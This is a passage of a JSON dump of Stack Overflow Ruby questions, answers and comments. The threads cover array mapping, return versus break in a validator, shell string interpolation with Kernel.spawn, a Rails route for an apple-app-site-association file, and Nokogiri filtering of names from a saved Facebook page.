"display_name": "pjs", "link": "https://stackoverflow.com/users/2166798/pjs"}, "edited": false, "score": 2, "creation_date": 1535489131, "post_id": 52065920, "comment_id": 91082337, "body": "I like that you added the <code>array[0]</code> version.  The first part of your answer deals with the specific stated problem, the second part generalizes if the inner arrays have multiple elements and you want one other than the first or last."}], "tags": [], "owner": {"reputation": 47232, "user_id": 1772830, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/Qtoqg.jpg?s=128&g=1", "display_name": "Andrey Deineko", "link": "https://stackoverflow.com/users/1772830/andrey-deineko"}, "is_accepted": true, "score": 5, "last_activity_date": 1535488894, "creation_date": 1535488894, "answer_id": 52065920, "question_id": 52065874, "link": "https://stackoverflow.com/questions/52065874/remove-secondary-items-from-a-ruby-array-of-arrays/52065920#52065920", "title": "Remove secondary items from a Ruby array of arrays", "body": "<blockquote>\n  <p>What I want is just an array of the first items</p>\n</blockquote>\n\n<p><a href=\"https://ruby-doc.org/core-2.5.1/Array.html#method-i-map\" rel=\"noreferrer\"><code>Array#map</code></a> and <a href=\"https://ruby-doc.org/core-2.5.1/Array.html#method-i-first\" rel=\"noreferrer\"><code>Array#first</code></a> will help you:</p>\n\n<pre><code>[[795, 10], [790, 7], [779, 3], [1117, 1]].map(&amp;:first)\n</code></pre>\n\n<p>The above is equal to </p>\n\n<pre><code>[[795, 10], [790, 7], [779, 3], [1117, 1]].map { |array| array[0] }\n</code></pre>\n"}], "owner": {"reputation": 22592, "user_id": 147586, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e4f5d494ebdc9e7cce1aecf3ce3e8bc1?s=128&d=identicon&r=PG", "display_name": "Shpigford", "link": "https://stackoverflow.com/users/147586/shpigford"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 44, "favorite_count": 0, "accepted_answer_id": 52065920, "answer_count": 1, "score": 1, "last_activity_date": 1535520771, "creation_date": 1535488682, "last_edit_date": 1535520771, "question_id": 52065874, "link": "https://stackoverflow.com/questions/52065874/remove-secondary-items-from-a-ruby-array-of-arrays", "title": "Remove secondary items from a Ruby array of arrays", "body": "<p>I have an array of arrays like this:</p>\n\n<pre><code>[[795, 10], [790, 7], [779, 3], [1117, 1]]\n</code></pre>\n\n<p>I want an array of the first items:</p>\n\n<pre><code>[795, 790, 779, 1117]\n</code></pre>\n\n<p>How do I remove the secondary items and return just an array of the first items?</p>\n"}, {"tags": ["ruby", "methods", "boolean", "boolean-operations"], "comments": [{"owner": {"reputation": 4690, "user_id": 1937435, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YyN37.jpg?s=128&g=1", "display_name": "Josh Brody", "link": "https://stackoverflow.com/users/1937435/josh-brody"}, "edited": false, "score": 2, "creation_date": 1535487002, "post_id": 52065339, "comment_id": 91081548, "body": "any <code>return</code> statement inside of a method will end any subsequent evaluation. if you wanted to break the loop, you&#39;d use <code>break</code>; if you wanted to go to the next iteration of the loop, you&#39;d use <code>next</code>"}], "answers": [{"tags": [], "owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "is_accepted": true, "score": 4, "last_activity_date": 1535487717, "last_edit_date": 1535487717, "creation_date": 1535487203, "answer_id": 52065555, "question_id": 52065339, "link": "https://stackoverflow.com/questions/52065339/understanding-impact-of-false-in-method/52065555#52065555", "title": "Understanding impact of false in method", "body": "<blockquote>\n  <p>I'm concerned (and want to make sure) that [it works].</p>\n</blockquote>\n\n<p>It does work (almost). With the slight mistake that you've written <code>&lt; 100</code> instead of <code>&lt;= 100</code>.</p>\n\n<p><code>return</code> exits the method immediately. The keyword <code>break</code>, on the other hand, would only exit the loop.</p>\n\n<p>But don't just take my word for it. (And asking someone on StackOverflow whether or not your code works isn't an efficient way to go about testing it!) Let's write a few <strong>tests</strong> for your code:</p>\n\n<pre><code>require 'rspec'\n\nRSpec.describe 'number_validator' do\n  subject { number_validator(*input) }\n\n  context 'integers only (valid input)' do\n    let(:input) { [1, 5, 80, 100] }\n    it { is_expected.to eq true }\n  end\n\n  context 'non positive integer' do\n    let(:input) { [1, 5, 0] }\n    it { is_expected.to eq false }\n  end\n\n  context 'integer greater than 100' do\n    let(:input) { [1, 5, 101] }\n    it { is_expected.to eq false }\n  end\n\n  context 'non integer' do\n    let(:input) { [1, 5, 'BAD'] }\n    it { is_expected.to eq false }\n  end\nend\n</code></pre>\n\n<p>You could write more edge cases too if you like, e.g. what if there is no input given (<code>number_validator()</code>), or a negative number (<code>number_validator(-1)</code>), or a non-integer number (<code>number_validator(3.5)</code>), ...</p>\n\n<p>Now that we have some tests, let's try rewriting that method slightly to something more elegant. We can be confident that it still works, because the tests should still pass!</p>\n\n<p>Rather than using <code>Array#each</code> with multiple <code>return</code> statements, we can instead use <a href=\"https://ruby-doc.org/core/Enumerable.html#method-i-all-3F\" rel=\"nofollow noreferrer\"><code>Enumerable#all?</code></a> to do the same thing in much less code (if you're willing to drop the <code>puts</code> statements):</p>\n\n<pre><code>def number_validator(*numbers)\n  numbers.all? { |number| number.is_a?(Integer) &amp;&amp; number &gt; 0 &amp;&amp; number &lt;= 100 }\nend\n</code></pre>\n\n<p>We can then simplify this even further, using <a href=\"https://ruby-doc.org/core/Comparable.html#method-i-between-3F\" rel=\"nofollow noreferrer\"><code>Comparable#between?</code></a>:</p>\n\n<pre><code>def number_validator(*numbers)\n  numbers.all? { |number| number.is_a?(Integer) &amp;&amp; number.between?(1, 100) }\nend\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 44, "user_id": 5070645, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b06fae2d0ad52575188662061c526aec?s=128&d=identicon&r=PG&f=1", "display_name": "dengsauve", "link": "https://stackoverflow.com/users/5070645/dengsauve"}, "is_accepted": false, "score": 1, "last_activity_date": 1535487533, "creation_date": 1535487533, "answer_id": 52065632, "question_id": 52065339, "link": "https://stackoverflow.com/questions/52065339/understanding-impact-of-false-in-method/52065632#52065632", "title": "Understanding impact of false in method", "body": "<p><a href=\"https://stackoverflow.com/users/9803237/nadnerb\">Nadnerb</a>, <code>return</code> will end any further continuation of the code, whereas <code>break</code> will exit the current loop and continue on to the next set of instructions.</p>\n"}], "owner": {"reputation": 69, "user_id": 9803237, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/549ea1590447cf15756fd4835f8403b8?s=128&d=identicon&r=PG&f=1", "display_name": "D1D2D3D4D5", "link": "https://stackoverflow.com/users/9803237/d1d2d3d4d5"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "accepted_answer_id": 52065555, "answer_count": 2, "score": 0, "last_activity_date": 1535521007, "creation_date": 1535486181, "last_edit_date": 1535521007, "question_id": 52065339, "link": "https://stackoverflow.com/questions/52065339/understanding-impact-of-false-in-method", "title": "Understanding impact of false in method", "body": "<p>My method handles the program loop for true/false. The code takes a number of integers, then checks:</p>\n\n<ol>\n<li>If the submitted value is a number</li>\n<li>If the number is between 1 and 100</li>\n</ol>\n\n<p>The code is:</p>\n\n<pre><code>def self.number_validator(*numbers)\n    numbers.each do |number|\n        unless number.is_a?(Integer)\n            puts \"#{number} is not an integer\" \n            return false\n        end\n        unless number &gt; 0 &amp;&amp; number &lt; 100\n            puts \"#{number} is out of range\"\n            return false\n        end\n    end\n    return true\nend\n</code></pre>\n\n<p>My understanding is that returning <code>false</code> will exit the whole method. I'm concerned and want to make sure that it does not break only the loop and return to the <code>return true</code> section. I want to make sure that the true value doesn't get triggered by the false value closing the loop and moving back to the overall method (rather than actually just reporting false and stopping the method).</p>\n"}, {"tags": ["arrays", "ruby"], "comments": [{"owner": {"reputation": 7, "user_id": 10286495, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-V8HpEo8KFHY/AAAAAAAAAAI/AAAAAAAADw8/gQUMdTNxu_E/photo.jpg?sz=128", "display_name": "bhupesh khatu", "link": "https://stackoverflow.com/users/10286495/bhupesh-khatu"}, "edited": false, "score": 0, "creation_date": 1535484815, "post_id": 52064879, "comment_id": 91080635, "body": "Used arry.map {|row| row[2]} and got the outcome."}, {"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "edited": false, "score": 1, "creation_date": 1535485114, "post_id": 52064879, "comment_id": 91080761, "body": "Can you edit the array to be effectively an array? It is not clear if it is multidimensional."}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535522343, "post_id": 52064879, "comment_id": 91090512, "body": "Can you show what <i>few</i> methods you tried?"}, {"owner": {"reputation": 7, "user_id": 10286495, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-V8HpEo8KFHY/AAAAAAAAAAI/AAAAAAAADw8/gQUMdTNxu_E/photo.jpg?sz=128", "display_name": "bhupesh khatu", "link": "https://stackoverflow.com/users/10286495/bhupesh-khatu"}, "edited": false, "score": 0, "creation_date": 1535545951, "post_id": 52064879, "comment_id": 91104770, "body": "cval = Array.new ck = Array.new cval = &lt;array with data as above&gt;  cval.each do |key| ck &lt;&lt;  key.values  ctgry =  ck.map {|row| row[4]} final_ctgry = ctgry.reject { |c| c.empty? }  // this removes empty rows in an array"}], "answers": [{"tags": [], "owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "is_accepted": false, "score": 6, "last_activity_date": 1535521715, "last_edit_date": 1535521715, "creation_date": 1535484864, "answer_id": 52065079, "question_id": 52064879, "link": "https://stackoverflow.com/questions/52064879/want-to-print-set-of-values-in-an-array/52065079#52065079", "title": "Want to print set of values in an Array", "body": "<p>If the array is like this:</p>\n\n<pre><code>array =[ \n[\"DealsNEvents-9\", \"GLOBAL\", \"dom_validation_config\", \"4\", \"gl_personal_care_appliances\"],\n[\"DealsNEvents-9\", \"GLOBAL\", \"dom_validation_config\", \"4\", \"gl_drugstore\"],\n[\"DealsNEvents-9\", \"GLOBAL\", \"dom_validation_config\", \"4\", \"gl_pantry\"],\n[\"DealsNEvents-9\", \"GLOBAL\", \"dom_validation_config\", \"4\", \"gl_pet_products\"],\n[\"DealsNEvents-9\", \"GLOBAL\", \"dom_validation_config\", \"4\", \"gl_grocery\"]\n]\n</code></pre>\n\n<p>Then, one option is build a new array containing the required elements: </p>\n\n<pre><code>array.map { |e| e.last }\n# =&gt; [\"gl_personal_care_appliances\", \"gl_drugstore\", \"gl_pantry\", \"gl_pet_products\", \"gl_grocery\"]\n</code></pre>\n\n<p>Or the compact version:</p>\n\n<pre><code>array.map(&amp;:last)\n</code></pre>\n\n<p>But if you just want to print the strings:</p>\n\n<pre><code>array.each { |e| puts e.last }\n\n# =&gt; gl_personal_care_appliances\n# =&gt; gl_drugstore\n# =&gt; gl_pantry\n# =&gt; gl_pet_products\n# =&gt; gl_grocery\n</code></pre>\n"}], "owner": {"reputation": 7, "user_id": 10286495, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-V8HpEo8KFHY/AAAAAAAAAAI/AAAAAAAADw8/gQUMdTNxu_E/photo.jpg?sz=128", "display_name": "bhupesh khatu", "link": "https://stackoverflow.com/users/10286495/bhupesh-khatu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 98, "favorite_count": 0, "closed_date": 1535522369, "answer_count": 1, "score": -1, "last_activity_date": 1535521715, "creation_date": 1535483915, "last_edit_date": 1535502312, "question_id": 52064879, "link": "https://stackoverflow.com/questions/52064879/want-to-print-set-of-values-in-an-array", "closed_reason": "Needs details or clarity", "title": "Want to print set of values in an Array", "body": "<p>I am new to Ruby programming and currently working on an automation, I have the following array. </p>\n\n<pre><code>arr = [\n  [\"DealsNEvents-9\", \"GLOBAL\", \"dom_validation_config\", \"4\", \"gl_personal_care_appliances\"],\n  [\"DealsNEvents-9\", \"GLOBAL\", \"dom_validation_config\", \"4\", \"gl_drugstore\"],\n  [\"DealsNEvents-9\", \"GLOBAL\", \"dom_validation_config\", \"4\", \"gl_pantry\"],\n  [\"DealsNEvents-9\", \"GLOBAL\", \"dom_validation_config\", \"4\", \"gl_pet_products\"],\n  [\"DealsNEvents-9\", \"GLOBAL\", \"dom_validation_config\", \"4\", \"gl_grocery\"]\n]\n</code></pre>\n\n<p>I would like to print the last element of each element (array) of <code>arr</code>, here <code>\"values gl_personal_care_appliances\"</code>, <code>\"gl_drugstore\"</code>, <code>\"gl_pantry\"</code>, <code>\"gl_pet_products\"</code> and <code>\"gl_grocery'</code>.</p>\n\n<p>I tried few methods taking reference from net but no success. Any lead or assistance </p>\n"}, {"tags": ["ruby", "shell", "string-interpolation"], "comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1535483512, "post_id": 52064750, "comment_id": 91080032, "body": "Single-quoted strings don&#39;t process interpolation. Make it a double-quoted one."}], "answers": [{"comments": [{"owner": {"reputation": 39, "user_id": 9431520, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7295c9162670dd2a0659bc082015ce04?s=128&d=identicon&r=PG&f=1", "display_name": "user255580", "link": "https://stackoverflow.com/users/9431520/user255580"}, "edited": false, "score": 0, "creation_date": 1535484587, "post_id": 52064800, "comment_id": 91080535, "body": "Awesome, thanks   was just a stupid move on  my end, thanks for the clarification!"}], "tags": [], "owner": {"reputation": 1897, "user_id": 1700875, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/0646fe9ddfc9005bad11ea9736db5a15?s=128&d=identicon&r=PG", "display_name": "Nathan Wallace", "link": "https://stackoverflow.com/users/1700875/nathan-wallace"}, "is_accepted": true, "score": 0, "last_activity_date": 1535483521, "creation_date": 1535483521, "answer_id": 52064800, "question_id": 52064750, "link": "https://stackoverflow.com/questions/52064750/ruby-string-interpolation-in-a-shell-execution/52064800#52064800", "title": "Ruby String interpolation in a shell execution", "body": "<p>The issue is that you're using single quotes for the string. Single-quoted strings don't use interpolation. Here's something that works:</p>\n\n<pre><code>require 'date'\nputs \"Start\"\ndatuh = DateTime.now\nputs datuh\npid1 = Kernel.spawn(\"mkdir -p \\\"#{datuh}\\\"\")\nProcess.wait pid1\nputs \"Finished\"\n</code></pre>\n\n<p>More details here: <a href=\"https://ruby-for-beginners.rubymonstas.org/bonus/string_interpolation.html\" rel=\"nofollow noreferrer\">https://ruby-for-beginners.rubymonstas.org/bonus/string_interpolation.html</a></p>\n"}, {"comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1535526829, "post_id": 52065070, "comment_id": 91092749, "body": "<a href=\"https://ruby-doc.org/stdlib-2.5.1/libdoc/fileutils/rdoc/FileUtils.html#method-c-mkdir_p\" rel=\"nofollow noreferrer\">ruby-doc.org/stdlib-2.5.1/libdoc/fileutils/rdoc/&hellip;</a>"}], "tags": [], "owner": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "is_accepted": false, "score": 2, "last_activity_date": 1535552873, "last_edit_date": 1535552873, "creation_date": 1535484796, "answer_id": 52065070, "question_id": 52064750, "link": "https://stackoverflow.com/questions/52064750/ruby-string-interpolation-in-a-shell-execution/52065070#52065070", "title": "Ruby String interpolation in a shell execution", "body": "<p>To avoid the quoting problems, you might want to another form of <code>spawn</code>:</p>\n\n<pre><code>pid = Kernel.spawn 'mkdir', '-p', datuh.to_s\n</code></pre>\n\n<p>However, why call out to the system?</p>\n\n<pre><code>Dir.mkdir datuh.to_s\n</code></pre>\n\n<p>Or, to incorporate the \"don't throw an error\" functionality provided by  <code>-p</code>:</p>\n\n<pre><code>begin\n  Dir.mkdir datuh.to_s\nrescue SystemCallError =&gt; e\n  raise e unless e.errno == Errno::EEXISTS::Errno\nend\n</code></pre>\n\n<p>Or,</p>\n\n<pre><code>require 'fileutils'\nFileUtils.mkdir_p datuh.to_s\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 9431520, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7295c9162670dd2a0659bc082015ce04?s=128&d=identicon&r=PG&f=1", "display_name": "user255580", "link": "https://stackoverflow.com/users/9431520/user255580"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 127, "favorite_count": 0, "accepted_answer_id": 52064800, "answer_count": 2, "score": 1, "last_activity_date": 1535552873, "creation_date": 1535483305, "question_id": 52064750, "link": "https://stackoverflow.com/questions/52064750/ruby-string-interpolation-in-a-shell-execution", "title": "Ruby String interpolation in a shell execution", "body": "<p>I am trying to make part of a program, that will create a folder with the current date as the foldername, the simplest way seems to be using string interpolation but that doesn't work and I'm not sure how to get the variable to be used</p>\n\n<pre><code>require 'date'\nputs \"Start\"\ndatuh = DateTime.now\nputs datuh\npid1 = Kernel.spawn('mkdir -p \"#{datuh}\"')\nProcess.wait pid1\nputs \"Finished\"\n</code></pre>\n\n<p>the end goal is to make a folder with the current date, but it makes a folder with the name #{datuh} right now</p>\n\n<p>Thanks</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ios-universal-links"], "answers": [{"comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1535480619, "post_id": 52064136, "comment_id": 91078694, "body": "yeah, at least they&#39;ll have to define the controller"}, {"owner": {"reputation": 43, "user_id": 2980927, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/573d15a91904031466f3e15e3d30aaaf?s=128&d=identicon&r=PG&f=1", "display_name": "Qman", "link": "https://stackoverflow.com/users/2980927/qman"}, "edited": false, "score": 0, "creation_date": 1535483700, "post_id": 52064136, "comment_id": 91080132, "body": "Went ahead and added the method to my application controller but I&#39;m getting the error  &#39;apple_app_site_assocation&#39; could not be found for ApplicationController"}, {"owner": {"reputation": 4690, "user_id": 1937435, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YyN37.jpg?s=128&g=1", "display_name": "Josh Brody", "link": "https://stackoverflow.com/users/1937435/josh-brody"}, "edited": false, "score": 0, "creation_date": 1535484734, "post_id": 52064136, "comment_id": 91080603, "body": "add that method to your application_controller.rb then"}, {"owner": {"reputation": 331, "user_id": 665309, "user_type": "registered", "accept_rate": 55, "profile_image": "https://lh6.googleusercontent.com/-6_p3qRKFTHA/AAAAAAAAAAI/AAAAAAAAN_o/NhIF3NI3RI0/photo.jpg?sz=128", "display_name": "chrstnwhlrt", "link": "https://stackoverflow.com/users/665309/chrstnwhlrt"}, "edited": false, "score": 1, "creation_date": 1561461059, "post_id": 52064136, "comment_id": 100062948, "body": "Theres actually a typo within the example:  pages#apple_app_site_assocation should be pages#apple_app_site_association"}, {"owner": {"reputation": 739, "user_id": 2515660, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/0f24d99c818ffc04b824cf72afbee4ce?s=128&d=identicon&r=PG&f=1", "display_name": "red-devil", "link": "https://stackoverflow.com/users/2515660/red-devil"}, "edited": false, "score": 2, "creation_date": 1573432902, "post_id": 52064136, "comment_id": 103870039, "body": "What about the .well-known directory here?"}, {"owner": {"reputation": 69, "user_id": 834094, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/3dacbe8efc1f3849830c0b74df0fb715?s=128&d=identicon&r=PG", "display_name": "James", "link": "https://stackoverflow.com/users/834094/james"}, "edited": false, "score": 0, "creation_date": 1595542741, "post_id": 52064136, "comment_id": 111520006, "body": "That typo had me scratching my head for 20 minutes."}], "tags": [], "owner": {"reputation": 4690, "user_id": 1937435, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YyN37.jpg?s=128&g=1", "display_name": "Josh Brody", "link": "https://stackoverflow.com/users/1937435/josh-brody"}, "is_accepted": true, "score": 6, "last_activity_date": 1595543588, "last_edit_date": 1595543588, "creation_date": 1535480485, "answer_id": 52064136, "question_id": 52064013, "link": "https://stackoverflow.com/questions/52064013/how-to-put-rails-environment-variable-in-apple-app-site-association-file-for-uni/52064136#52064136", "title": "How to put Rails environment variable in apple-app-site-association file for universal links?", "body": "<p>The most straightforward way would be to just add a route.</p>\n<p><code>get '/apple-app-site-association' =&gt; 'pages#apple_app_site_association'</code></p>\n<pre class=\"lang-rb prettyprint-override\"><code>def apple_app_site_association\n  render :json =&gt; {&quot;applinks&quot;:{&quot;apps&quot;:[],&quot;details&quot;:[{&quot;appID&quot;: Rails.configuration.appID,&quot;paths&quot;:&quot;*&quot;}]}}\nend\n</code></pre>\n<p>You may need to do more than that, but that should at least get you moving in the right direction.</p>\n<p>Update 2020: Typo in route path fixed</p>\n"}], "owner": {"reputation": 43, "user_id": 2980927, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/573d15a91904031466f3e15e3d30aaaf?s=128&d=identicon&r=PG&f=1", "display_name": "Qman", "link": "https://stackoverflow.com/users/2980927/qman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 819, "favorite_count": 2, "accepted_answer_id": 52064136, "answer_count": 1, "score": 4, "last_activity_date": 1595543588, "creation_date": 1535479852, "question_id": 52064013, "link": "https://stackoverflow.com/questions/52064013/how-to-put-rails-environment-variable-in-apple-app-site-association-file-for-uni", "title": "How to put Rails environment variable in apple-app-site-association file for universal links?", "body": "<p>So currently I have inside the public folder a file called \"apple-app-site-association\" with the content:</p>\n\n<pre><code>{\"applinks\":{\"apps\":[],\"details\":[{\"appID\":\"{#Rails.configuration.appID}\",\"paths\":\"*\"}]}}\n</code></pre>\n\n<p>Obviously the {#Rails.configuration.appID} is not being generated dynamically and is being output literally, but I would like it to be reading from the config file, where appID is defined. How can I go about this??</p>\n"}, {"tags": ["html", "css", "ruby", "nokogiri"], "comments": [{"owner": {"reputation": 686, "user_id": 1491410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c938ed150a685b33d1b91266b382c8d?s=128&d=identicon&r=PG", "display_name": "elliotcm", "link": "https://stackoverflow.com/users/1491410/elliotcm"}, "edited": false, "score": 0, "creation_date": 1535482563, "post_id": 52063941, "comment_id": 91079619, "body": "Can you post a small example block of HTML for one of these comments?"}, {"owner": {"reputation": 3, "user_id": 5191420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f6da05c6f66f54b85ac80a786ca324ab?s=128&d=identicon&r=PG&f=1", "display_name": "lulabromark", "link": "https://stackoverflow.com/users/5191420/lulabromark"}, "reply_to_user": {"reputation": 686, "user_id": 1491410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c938ed150a685b33d1b91266b382c8d?s=128&d=identicon&r=PG", "display_name": "elliotcm", "link": "https://stackoverflow.com/users/1491410/elliotcm"}, "edited": false, "score": 0, "creation_date": 1535484363, "post_id": 52063941, "comment_id": 91080427, "body": "sure, Facebook has a lot of code, but this is the smallest sample I could get...  i had to put it on Google Drive since it was too long <a href=\"https://drive.google.com/file/d/1djxVelyd_9PAgPGJ4SwNCVQzp4gsEme3/view?usp=sharing\" rel=\"nofollow noreferrer\">drive.google.com/file/d/1djxVelyd_9PAgPGJ4SwNCVQzp4gsEme3/&hellip;</a>"}, {"owner": {"reputation": 47898, "user_id": 966023, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/917fcb4327159076f752c0c3c3fddfbb?s=128&d=identicon&r=PG", "display_name": "pguardiario", "link": "https://stackoverflow.com/users/966023/pguardiario"}, "edited": false, "score": 0, "creation_date": 1535494601, "post_id": 52063941, "comment_id": 91084166, "body": "It&#39;s not clear what you&#39;re trying to do. Try again with a small bit of html and desired output."}, {"owner": {"reputation": 3, "user_id": 5191420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f6da05c6f66f54b85ac80a786ca324ab?s=128&d=identicon&r=PG&f=1", "display_name": "lulabromark", "link": "https://stackoverflow.com/users/5191420/lulabromark"}, "edited": false, "score": 0, "creation_date": 1535495668, "post_id": 52063941, "comment_id": 91084401, "body": "sorry, I&#39;ll try to explain better... for a post in Facebook, we have about 300 comments, I only want to get the individuals who actually posted each comment <a href=\"https://drive.google.com/file/d/14-69HNnUUchiKLQMoBehuxjQDc0v94T2/view?usp=sharing\" rel=\"nofollow noreferrer\">drive.google.com/file/d/14-69HNnUUchiKLQMoBehuxjQDc0v94T2/&hellip;</a> but with my current code I&#39;m also getting people who also replied to the original comments <a href=\"https://drive.google.com/file/d/1opVpSW1paH0burIPjpsHKQgUi_0SgWEx/view?usp=sharing\" rel=\"nofollow noreferrer\">drive.google.com/file/d/1opVpSW1paH0burIPjpsHKQgUi_0SgWEx/&hellip;</a>  Say Person A commented and then Person B and Person C replied to that comment. I only want the name of Person A but am currently also getting B and C."}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 5191420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f6da05c6f66f54b85ac80a786ca324ab?s=128&d=identicon&r=PG&f=1", "display_name": "lulabromark", "link": "https://stackoverflow.com/users/5191420/lulabromark"}, "edited": false, "score": 0, "creation_date": 1535496933, "post_id": 52067066, "comment_id": 91084753, "body": "thank you so much! that worked perfectly and I mostly understand it!"}], "tags": [], "owner": {"reputation": 1197, "user_id": 400743, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1a0d5c51291898c92154ba4ac1c56cd6?s=128&d=identicon&r=PG", "display_name": "Bartosz Pietraszko", "link": "https://stackoverflow.com/users/400743/bartosz-pietraszko"}, "is_accepted": true, "score": 0, "last_activity_date": 1535495736, "creation_date": 1535495736, "answer_id": 52067066, "question_id": 52063941, "link": "https://stackoverflow.com/questions/52063941/nokogiri-exclude-html-class/52067066#52067066", "title": "Nokogiri Exclude HTML Class", "body": "<p>Traverse ancestors for every <code>.UFICommentActorName</code> element, to reject those contained within a <code>.UFIReplyList</code> element.</p>\n\n<pre><code>@authors_nodes = doc.css(\".UFICommentActorName\").reject do |node|\n\n  # extract all ancestor class names; \n  # beware of random whitespace and multiple classes per node\n  class_names = node.ancestors.map{ |a| a.attributes['class'].value rescue nil }\n  class_names = class_names.compact.map{ |names| names.split(' ') }\n  class_names = class_names.flatten.map(&amp;:strip)\n\n  # reject if .UFIReplyList found\n  class_names.include?('UFIReplyList')\n\nend\n\n@authors_nodes.map(&amp;:text)\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 5191420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f6da05c6f66f54b85ac80a786ca324ab?s=128&d=identicon&r=PG&f=1", "display_name": "lulabromark", "link": "https://stackoverflow.com/users/5191420/lulabromark"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 178, "favorite_count": 0, "accepted_answer_id": 52067066, "answer_count": 1, "score": 0, "last_activity_date": 1535495736, "creation_date": 1535479583, "question_id": 52063941, "link": "https://stackoverflow.com/questions/52063941/nokogiri-exclude-html-class", "title": "Nokogiri Exclude HTML Class", "body": "<p>I'm trying to scrape the names of all the people who commented on a post in our Facebook group. I downloaded the file locally and am able to scrape the names of the people who commented plus the people who replied to those comments. I only want the original comments, not the replies... it seems like I have to exclude the UFIReplyList class but my code is still pulling all the names. Any help would be greatly appreciated. Thanks! </p>\n\n<pre><code>require 'nokogiri'\nrequire 'pry'\n\nclass Scraper\n  @@all = []\n\n  def get_page\n    file = File.read('/Users/mark/Desktop/raffle.html')\n    doc = Nokogiri::HTML(file)\n    # binding.pry\n\n    doc.css(\".UFICommentContent\").each do |post|\n      # binding.pry\n      author = post.css(\".UFICommentActorName\").css(\":not(.UFIReplyList)\").text\n\n      @@all &lt;&lt; author\n    end\n\n    puts @@all\n  end\nend\n\nScraper.new.get_page\n</code></pre>\n"}, {"tags": ["ruby", "regex"], "comments": [{"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535479586, "post_id": 52063466, "comment_id": 91078226, "body": "An regex has class <a 